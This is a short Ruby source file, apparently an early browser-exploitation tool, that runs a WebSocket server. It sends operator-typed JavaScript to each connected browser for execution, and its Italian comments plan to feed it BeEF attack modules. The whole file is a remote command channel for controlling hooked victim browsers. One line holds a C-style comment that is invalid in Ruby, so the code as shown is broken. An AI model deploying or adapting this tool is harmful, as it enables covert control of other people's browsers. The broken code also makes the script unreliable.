# Copyright 2012 Graziano [radoen] Felline scream1988@gmail.com
#Licensed under the Apache License, Version 2.0 (the "License");
#you may not use this file except in compliance with the License.
#You may obtain a copy of the License at
#http://www.apache.org/licenses/LICENSE-2.0
#Unless required by applicable law or agreed to in writing, software
#distributed under the License is distributed on an "AS IS" BASIS,
#WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#See the License for the specific language governing permissions and
#limitations under the License.


$LOAD_PATH << File.dirname(__FILE__) + "/lib"
require "web_socket"

Thread.abort_on_exception = true
# WebSocket.debug = true

if ARGV.size != 2
  $stderr.puts("Usage: ruby server.rb ACCEPTED_DOMAIN PORT")
  exit(1)
end

server = WebSocketServer.new(
    :accepted_domains => [ARGV[0]],
    :port => ARGV[1].to_i())
puts("Server is running at port %d" % server.port)
server.run() do |ws|
  puts("Connection accepted")
  puts("Path: #{ws.path}, Origin: #{ws.origin}")
  if ws.path == "/"
    ws.handshake()
    while 1
      puts("Write Javascript will be execute [Enter] ")
      #@TODO Qui l'interfacciamento con Beef così prendo il js dai moduli suoi e abbiamo tanta roba'
      command=$stdin.gets        /*let's read!!!*/
      ws.send(command)
      ceck=ws.receive();
      #@TODO Un controllo un po più serio e come lo prendo l'eventuale valore di ritorno i modufli di beef usano funzioni sue

      if (ceck == command)
        printf("\nSent: %p\n", ceck)
      else
        printf("\nError: %p\n", ceck)
      end
    end
  else
    ws.handshake("404 Not Found")
  end
  puts("Connection closed")
end
